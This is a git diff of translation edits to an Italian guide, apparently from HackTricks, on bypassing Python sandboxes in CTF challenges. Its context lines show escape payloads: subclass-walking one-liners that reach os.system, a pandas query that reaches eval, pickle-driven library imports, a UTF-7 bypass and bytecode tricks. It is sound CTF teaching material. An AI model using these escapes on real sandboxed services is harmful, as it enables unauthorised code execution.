@@ -52,7 +52,7 @@ Python cerca di **caricare le librerie dalla directory corrente per prima** (il 
 ### Pacchetti di default
 
 Puoi trovare un **elenco dei pacchetti pre-installati** qui: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Nota che da un pickle puoi fare in modo che l'ambiente python **importi librerie arbitrarie** installate nel sistema.\
+Nota che da un pickle puoi far sì che l'ambiente python **importi librerie arbitrarie** installate nel sistema.\
 Ad esempio, il seguente pickle, quando caricato, importerà la libreria pip per usarla:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
@@ -137,7 +137,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassare le protezioni attraverso le codifiche (UTF-7)
 
-In [**questo writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 viene utilizzato per caricare ed eseguire codice python arbitrario all'interno di un apparente sandbox:
+In [**questo articolo**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 viene utilizzato per caricare ed eseguire codice python arbitrario all'interno di un apparente sandbox:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -314,10 +314,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### No Builtins
 
-Quando non hai `__builtins__`, non sarai in grado di importare nulla né di leggere o scrivere file poiché **tutte le funzioni globali** (come `open`, `import`, `print`...) **non sono caricate**.\
+Quando non hai `__builtins__` non sarai in grado di importare nulla né di leggere o scrivere file poiché **tutte le funzioni globali** (come `open`, `import`, `print`...) **non sono caricate**.\
 Tuttavia, **per impostazione predefinita, python importa molti moduli in memoria**. Questi moduli possono sembrare benigni, ma alcuni di essi **importano anche funzionalità pericolose** al loro interno che possono essere accessibili per ottenere anche **l'esecuzione di codice arbitrario**.
 
-Nei seguenti esempi puoi osservare come **abuse** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità** **pericolose** al loro interno.
+Negli esempi seguenti puoi osservare come **abuse** di alcuni di questi moduli "**benigni**" caricati per **accedere** a **funzionalità** **pericolose** al loro interno.
 
 **Python2**
 ```python
@@ -448,7 +448,7 @@ Ci sono molti, e **ne abbiamo solo bisogno di uno** per eseguire comandi:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Possiamo fare la stessa cosa con **altre librerie** che sappiamo possano essere utilizzate per **eseguire comandi**:
+Possiamo fare la stessa cosa con **altre librerie** che sappiamo possono essere utilizzate per **eseguire comandi**:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -771,10 +771,10 @@ Questo gadget consente di **caricare una libreria dal disco**. Pertanto, è nece
 ```
 La sfida sfrutta in realtà un'altra vulnerabilità nel server che consente di creare file arbitrari nel disco dei server.
 
-## Dissezione degli oggetti Python
+## Dissezionare gli Oggetti Python
 
 > [!TIP]
-> Se vuoi **imparare** a conoscere **il bytecode di python** in profondità, leggi questo **fantastico** post sull'argomento: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> Se vuoi **imparare** a conoscere **il bytecode di python** in profondità leggi questo **fantastico** post sull'argomento: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
 In alcuni CTF potresti ricevere il nome di una **funzione personalizzata in cui risiede il flag** e devi esaminare gli **interni** della **funzione** per estrarlo.
 
@@ -899,7 +899,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Nota che **se non puoi importare `dis` nel sandbox python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili che vengono caricate (`LOAD_CONST`), ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile che viene caricata.
+Nota che **se non puoi importare `dis` nel sandbox di python** puoi ottenere il **bytecode** della funzione (`get_flag.func_code.co_code`) e **disassemblarlo** localmente. Non vedrai il contenuto delle variabili che vengono caricate (`LOAD_CONST`), ma puoi indovinarle da (`get_flag.func_code.co_consts`) perché `LOAD_CONST` indica anche l'offset della variabile che viene caricata.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -924,7 +924,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Compilare Python
 
 Ora, immaginiamo che in qualche modo tu possa **estrarre le informazioni su una funzione che non puoi eseguire** ma che **devi** **eseguire**.\
-Come nel seguente esempio, puoi **accedere all'oggetto codice** di quella funzione, ma leggendo solo il disassemblaggio non **sai come calcolare il flag** (_immagina una funzione `calc_flag` più complessa_)
+Come nel seguente esempio, puoi **accedere all'oggetto codice** di quella funzione, ma leggendo solo il disassemblaggio **non sai come calcolare il flag** (_immagina una funzione `calc_flag` più complessa_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -983,10 +983,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-In previous examples at the beginning of this post, you can see **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **unico comando** (e potremmo fare lo stesso usando **`exec`**).\
+Negli esempi precedenti all'inizio di questo post, puoi vedere **come eseguire qualsiasi codice python utilizzando la funzione `compile`**. Questo è interessante perché puoi **eseguire interi script** con cicli e tutto in un **un'unica riga** (e potremmo fare lo stesso usando **`exec`**).\
 Comunque, a volte potrebbe essere utile **creare** un **oggetto compilato** su una macchina locale ed eseguirlo sulla **macchina CTF** (ad esempio perché non abbiamo la funzione `compiled` nel CTF).
 
-Per esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
+Ad esempio, compiliamo ed eseguiamo manualmente una funzione che legge _./poc.py_:
 ```python
 #Locally
 def read():
